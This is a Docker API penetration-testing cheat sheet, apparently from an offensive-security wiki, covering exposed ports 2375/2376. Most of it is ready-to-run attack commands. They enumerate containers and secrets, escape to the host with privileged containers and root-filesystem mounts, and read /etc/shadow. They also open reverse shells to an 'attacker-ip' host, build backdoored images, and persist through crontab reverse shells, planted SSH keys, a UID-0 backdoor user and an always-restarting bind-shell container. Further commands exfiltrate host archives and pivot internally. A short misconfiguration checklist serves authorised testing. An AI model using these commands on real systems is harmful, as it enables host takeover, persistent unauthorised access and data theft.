# Docker

**`Default Ports: 2375 (HTTP), 2376 (HTTPS)`**

**Docker** is a containerization platform that allows developers to package applications and their dependencies into isolated containers. The Docker API provides remote management capabilities, enabling administration of Docker hosts over the network. When exposed without proper authentication, it can lead to complete host compromise.

### Connect <a href="#connect" id="connect"></a>

#### Using Docker Client <a href="#using-docker-client" id="using-docker-client"></a>

The Docker CLI can connect to remote Docker daemons for management and exploitation:

**Set Persistent Connection (Unencrypted)**

```
export DOCKER_HOST="tcp://target.com:2375"
docker ps
```

**Set Persistent Connection with TLS**

```
export DOCKER_HOST="tcp://target.com:2376"
export DOCKER_TLS_VERIFY=1
docker --tlsverify ps
```

**Execute One-Time Commands**

```
# Unencrypted
docker -H tcp://target.com:2375 ps

# With TLS
docker -H tcp://target.com:2376 --tlsverify ps
```

#### Using cURL <a href="#using-curl" id="using-curl"></a>

cURL allows direct interaction with the Docker REST API for enumeration and exploitation:

**Get Docker Version Information**

```
curl http://target.com:2375/version
```

**List All Containers**

```
curl http://target.com:2375/containers/json
```

**List Available Images**

```
curl http://target.com:2375/images/json
```

**Retrieve System Information**

```
curl http://target.com:2375/info
```

#### Using Docker API Directly <a href="#using-docker-api-directly" id="using-docker-api-directly"></a>

```
# Python example
import docker

client = docker.DockerClient(base_url='tcp://target.com:2375')
print(client.containers.list())
print(client.images.list())
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use `Nmap` to check if the Docker API is exposed and determine if it requires authentication.

**Basic Port and Version Detection**

```
nmap -p 2375,2376 -sV target.com
```

**Docker Information Scripts**

```
nmap -p 2375 --script docker-version,docker-info target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Identify the Docker version and gather initial information about the Docker daemon using various tools.

**Using Netcat**

```
nc -vn target.com 2375
```

**Using cURL for Version Information**

```
curl -s http://target.com:2375/version
```

**Get Detailed Information with JSON Parsing**

```
curl -s http://target.com:2375/version | jq .
curl -s http://target.com:2375/info | jq .
```

#### Check Authentication <a href="#check-authentication" id="check-authentication"></a>

Determine if the Docker API requires authentication and test different connection methods.

**Test Unencrypted Authentication**

```
curl -s http://target.com:2375/containers/json

# If returns container list: No authentication
# If returns error: Authentication required
# If connection refused: Service not exposed or firewall
```

**Test TLS Connection**

```
openssl s_client -connect target.com:2376
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Container Enumeration <a href="#container-enumeration" id="container-enumeration"></a>

Listing containers reveals running applications, their configurations, and potential attack targets.

**List Running Containers**

```
docker -H tcp://target.com:2375 ps
```

**List All Containers**

```
docker -H tcp://target.com:2375 ps -a
```

**Get Container Details**

```
docker -H tcp://target.com:2375 inspect <container_id>
```

**Using API Directly**

```
curl http://target.com:2375/containers/json?all=1
```

**Check Container Processes**

```
docker -H tcp://target.com:2375 top <container_id>
```

#### Image Enumeration <a href="#image-enumeration" id="image-enumeration"></a>

Docker images can contain sensitive information, credentials, and application secrets.

**List Available Images**

```
docker -H tcp://target.com:2375 images
```

**Get Image Details**

```
docker -H tcp://target.com:2375 inspect <image_id>
```

**View Image History**

```
docker -H tcp://target.com:2375 history <image_id>
```

**Using API for Images**

```
curl http://target.com:2375/images/json
```

#### Network Enumeration <a href="#network-enumeration" id="network-enumeration"></a>

Discover Docker networks and their configurations to understand container communication.

**List Docker Networks**

```
docker -H tcp://target.com:2375 network ls
```

**Inspect Network Details**

```
docker -H tcp://target.com:2375 network inspect bridge
```

**Using API for Networks**

```
curl http://target.com:2375/networks
```

#### Volume Enumeration <a href="#volume-enumeration" id="volume-enumeration"></a>

Identify Docker volumes that may contain persistent data or sensitive information.

**List Docker Volumes**

```
docker -H tcp://target.com:2375 volume ls
```

**Inspect Volume Details**

```
docker -H tcp://target.com:2375 volume inspect <volume_name>
```

**Using API for Volumes**

```
curl http://target.com:2375/volumes
```

#### System Information <a href="#system-information" id="system-information"></a>

Gather comprehensive information about the Docker daemon and host system.

**Get Docker Information**

```
docker -H tcp://target.com:2375 info
```

**Get Docker Version**

```
docker -H tcp://target.com:2375 version
```

**Check Disk Usage**

```
docker -H tcp://target.com:2375 system df
```

**Using API for System Info**

```
curl http://target.com:2375/info | jq .
curl http://target.com:2375/version | jq .
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Container Escape via Privileged Container <a href="#container-escape-via-privileged-container" id="container-escape-via-privileged-container"></a>

Privileged containers bypass security restrictions and allow direct access to the host system. This is one of the most effective methods for escaping container isolation and gaining root access to the underlying host.

**Creating Privileged Container**

```
docker -H tcp://target.com:2375 run -it --privileged \
  --pid=host --net=host --ipc=host \
  -v /:/host ubuntu /bin/bash
```

**Accessing Host System**

```
# Inside container, access host filesystem
chroot /host /bin/bash

# Now you have root on the host system
whoami  # root
cat /etc/shadow
```

#### Container Escape via Volume Mount <a href="#container-escape-via-volume-mount" id="container-escape-via-volume-mount"></a>

Volume mounting allows containers to access host filesystems, potentially leading to host compromise when sensitive directories are mounted.

**Mount Host Root Filesystem**

```
docker -H tcp://target.com:2375 run -it \
  -v /:/hostfs ubuntu /bin/bash
```

**Access Host Files**

```
cd /hostfs
cat /hostfs/etc/shadow
```

**Establish Persistence**

```
# Write SSH key for persistence
mkdir -p /hostfs/root/.ssh
echo "ssh-rsa AAAA..." > /hostfs/root/.ssh/authorized_keys
chmod 600 /hostfs/root/.ssh/authorized_keys
```

#### Reverse Shell via New Container <a href="#reverse-shell-via-new-container" id="reverse-shell-via-new-container"></a>

Create new containers with reverse shell capabilities to establish remote access to the Docker host.

**Create Container with Bash Reverse Shell**

```
docker -H tcp://target.com:2375 run -d \
  ubuntu /bin/bash -c \
  "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"
```

**Create Container with Netcat Reverse Shell**

```
docker -H tcp://target.com:2375 run -d \
  ubuntu nc attacker-ip 4444 -e /bin/bash
```

**Mount Host and Execute Reverse Shell**

```
docker -H tcp://target.com:2375 run -d \
  -v /:/hostfs ubuntu \
  /bin/bash -c "chroot /hostfs bash -i >& /dev/tcp/attacker-ip/4444 0>&1"
```

#### Execute Commands in Existing Container <a href="#execute-commands-in-existing-container" id="execute-commands-in-existing-container"></a>

Execute commands within running containers to gain access and perform reconnaissance.

**Execute Single Command**

```
docker -H tcp://target.com:2375 exec <container_id> whoami
```

**Get Interactive Shell**

```
docker -H tcp://target.com:2375 exec -it <container_id> /bin/bash
```

**Execute as Root**

```
docker -H tcp://target.com:2375 exec -u root -it <container_id> /bin/bash
```

**Using API for Command Execution**

```
curl -X POST -H "Content-Type: application/json" \
  http://target.com:2375/containers/<container_id>/exec \
  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["/bin/bash"],"DetachKeys":"ctrl-p,ctrl-q","Privileged":false,"Tty":true}'
```

#### Image Backdooring <a href="#image-backdooring" id="image-backdooring"></a>

Create malicious Docker images with backdoors to establish persistent access or compromise other systems.

**Pull Legitimate Image**

```
docker -H tcp://target.com:2375 pull ubuntu
```

**Create Malicious Dockerfile**

```
cat > Dockerfile <<EOF
FROM ubuntu
RUN apt-get update && apt-get install -y netcat
CMD ["nc", "-lvp", "4444", "-e", "/bin/bash"]
EOF
```

**Build and Deploy Backdoored Image**

```
# Build backdoored image
docker build -t ubuntu:backdoor .

# Save and upload
docker save ubuntu:backdoor > backdoor.tar
curl -X POST -H "Content-Type: application/x-tar" \
  --data-binary @backdoor.tar \
  http://target.com:2375/images/load
```

#### Docker Socket Abuse <a href="#docker-socket-abuse" id="docker-socket-abuse"></a>

Exploit containers that have the Docker socket mounted, allowing control of the Docker daemon from within a container.

**Check for Docker Socket**

```
ls -la /var/run/docker.sock
```

**Control Docker from Container**

```
docker -H unix:///var/run/docker.sock ps
```

**Escape to Host**

```
docker -H unix:///var/run/docker.sock run -it \
  -v /:/hostfs ubuntu chroot /hostfs /bin/bash
```

#### Secrets Extraction <a href="#secrets-extraction" id="secrets-extraction"></a>

Extract sensitive information including secrets, credentials, and configuration data from Docker containers and images.

**List Docker Swarm Secrets**

```
docker -H tcp://target.com:2375 secret ls
```

**Inspect Secret Details**

```
docker -H tcp://target.com:2375 secret inspect <secret_id>
```

**Search for Sensitive Files**

```
docker -H tcp://target.com:2375 exec <container_id> \
  find / -name "*.key" -o -name "*credential*" -o -name "*.pem" 2>/dev/null
```

**Check Environment Variables**

```
docker -H tcp://target.com:2375 exec <container_id> env
```

**Inspect Container Configuration**

```
docker -H tcp://target.com:2375 inspect <container_id> | grep -i "env\|secret\|password"
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Host Takeover <a href="#host-takeover" id="host-takeover"></a>

Gain complete control over the Docker host system through various persistence and privilege escalation methods.

**Create Privileged Container**

```
docker -H tcp://target.com:2375 run -it --rm --privileged \
  --pid=host --net=host -v /:/host alpine \
  chroot /host /bin/bash
```

**Establish Cron Job Persistence**

```
docker -H tcp://target.com:2375 run -v /etc:/hostfs/etc alpine \
  sh -c 'echo "* * * * * root bash -i >& /dev/tcp/attacker-ip/4444 0>&1" >> /hostfs/etc/crontab'
```

**Add SSH Key for Access**

```
docker -H tcp://target.com:2375 run -v /root:/hostfs/root alpine \
  sh -c 'mkdir -p /hostfs/root/.ssh && echo "ssh-rsa AAAA..." >> /hostfs/root/.ssh/authorized_keys'
```

**Create Backdoor User**

```
docker -H tcp://target.com:2375 run -v /etc:/hostfs/etc alpine \
  sh -c 'echo "backdoor:x:0:0::/root:/bin/bash" >> /hostfs/etc/passwd && echo "backdoor:password_hash" >> /hostfs/etc/shadow'
```

#### Container Persistence <a href="#container-persistence" id="container-persistence"></a>

Create persistent backdoor containers that maintain access even after system restarts.

**Create Persistent Backdoor Container**

```
docker -H tcp://target.com:2375 run -d --name backdoor \
  --restart always \
  -p 4444:4444 \
  ubuntu nc -lvp 4444 -e /bin/bash
```

**Verify Container Status**

```
docker -H tcp://target.com:2375 ps | grep backdoor
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract sensitive data from containers and host systems for analysis or exfiltration.

**Copy Files from Container**

```
docker -H tcp://target.com:2375 cp <container_id>:/etc/passwd /tmp/passwd
```

**Export Container Filesystem**

```
docker -H tcp://target.com:2375 export <container_id> > container.tar
tar -xf container.tar
```

**Backup Host Data**

```
docker -H tcp://target.com:2375 run -v /:/hostfs alpine \
  tar czf /tmp/backup.tar.gz /hostfs/etc /hostfs/root /hostfs/home
```

**Download Archive**

```
docker -H tcp://target.com:2375 cp <container_id>:/tmp/backup.tar.gz .
```

#### Registry Access <a href="#registry-access" id="registry-access"></a>

Access private Docker registries to extract images and search for sensitive information.

**Pull Images from Private Registry**

```
docker -H tcp://target.com:2375 pull registry.company.com/app:latest
```

**Extract Image Contents**

```
docker -H tcp://target.com:2375 save registry.company.com/app:latest > app.tar
tar -xf app.tar
```

**Search for Credentials**

```
grep -r "password\|secret\|key" .
```

#### Network Pivoting <a href="#network-pivoting" id="network-pivoting"></a>

Use Docker containers to pivot into internal networks and access additional systems.

**Create Host Network Container**

```
docker -H tcp://target.com:2375 run -it --net=host \
  alpine /bin/sh
```

**Install Network Tools**

```
apk add nmap
```

**Scan Internal Networks**

```
nmap -sn 192.168.0.0/24
nmap -p- 192.168.0.100
```

**Setup SOCKS Proxy**

```
docker -H tcp://target.com:2375 run -d \
  -p 1080:1080 \
  serjs/go-socks5-proxy
```

**Use Proxy for Pivoting**

```
# Edit /etc/proxychains.conf
# socks5 target.com 1080
proxychains nmap -sT 192.168.0.0/24
```

#### Container Modification <a href="#container-modification" id="container-modification"></a>

Modify existing containers and images to create persistent backdoors or extract sensitive information.

**Commit Container as New Image**

```
docker -H tcp://target.com:2375 commit <container_id> backdoored:latest
```

**Export and Analyze Image**

```
docker -H tcp://target.com:2375 save backdoored:latest > backdoored.tar
```

**Modify Image Layers**

```
# Extract tar
tar -xf backdoored.tar
# Modify layer contents
# Repackage
tar -cf modified.tar *
# Load back
docker -H tcp://target.com:2375 load < modified.tar
```

### Common Docker Commands <a href="#common-docker-commands" id="common-docker-commands"></a>

| Command          | Description              | Usage                                                 |
| ---------------- | ------------------------ | ----------------------------------------------------- |
| `docker ps`      | List running containers  | `docker -H tcp://target:2375 ps`                      |
| `docker ps -a`   | List all containers      | `docker -H tcp://target:2375 ps -a`                   |
| `docker images`  | List images              | `docker -H tcp://target:2375 images`                  |
| `docker exec`    | Execute in container     | `docker -H tcp://target:2375 exec -it <id> /bin/bash` |
| `docker run`     | Create and run container | `docker -H tcp://target:2375 run -it ubuntu`          |
| `docker inspect` | Get details              | `docker -H tcp://target:2375 inspect <id>`            |
| `docker logs`    | View logs                | `docker -H tcp://target:2375 logs <id>`               |
| `docker cp`      | Copy files               | `docker -H tcp://target:2375 cp <id>:/file .`         |

### Docker API Endpoints <a href="#docker-api-endpoints" id="docker-api-endpoints"></a>

| Endpoint                 | Method | Description            |
| ------------------------ | ------ | ---------------------- |
| `/version`               | GET    | Get Docker version     |
| `/info`                  | GET    | Get system information |
| `/containers/json`       | GET    | List containers        |
| `/containers/create`     | POST   | Create container       |
| `/containers/<id>/start` | POST   | Start container        |
| `/containers/<id>/exec`  | POST   | Execute command        |
| `/images/json`           | GET    | List images            |
| `/images/create`         | POST   | Pull/create image      |
| `/networks`              | GET    | List networks          |
| `/volumes`               | GET    | List volumes           |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool            | Description            | Primary Use Case         |
| --------------- | ---------------------- | ------------------------ |
| Docker CLI      | Official Docker client | Container management     |
| docker-py       | Python Docker library  | Automation and scripting |
| docker-compose  | Multi-container tool   | Orchestration            |
| docker-bench    | Security audit tool    | Configuration assessment |
| dive            | Image layer explorer   | Image analysis           |
| trivy           | Vulnerability scanner  | Image security scanning  |
| docker-explorer | Forensics tool         | Container investigation  |

### Security Misconfigurations to Test <a href="#security-misconfigurations-to-test" id="security-misconfigurations-to-test"></a>

* ❌ Docker API exposed without authentication
* ❌ Using unencrypted port 2375
* ❌ Privileged containers running
* ❌ Host filesystem mounted in containers
* ❌ Docker socket mounted in containers
* ❌ Containers running as root
* ❌ No resource limits on containers
* ❌ Exposed internal ports
* ❌ Using `:latest` tag for production
* ❌ No vulnerability scanning on images
* ❌ Secrets stored in images or environment variables
* ❌ No network segmentation between containers

### Container Escape Checks <a href="#container-escape-checks" id="container-escape-checks"></a>

```
# Check if running in container
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# Check for privileged mode
ip link add dummy0 type dummy 2>/dev/null && echo "Privileged" || echo "Not Privileged"

# Check capabilities
capsh --print

# Check mounted filesystems
mount | grep -i docker

# Check for Docker socket
ls -la /var/run/docker.sock

# Check for host proc
ls -la /proc/sys/kernel

# Check kernel version vs host
uname -r
```

<br>
